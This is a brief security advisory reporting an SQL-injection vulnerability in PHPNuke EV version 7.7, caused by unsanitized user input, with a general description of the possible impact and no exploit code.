PHPNuke EV is prone to an SQL-injection vulnerability because the application fails to properly sanitize user-supplied input before using it in an SQL query.

A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation.

PHPNuke EV version 7.7 is vulnerable; earlier versions may also be affected.
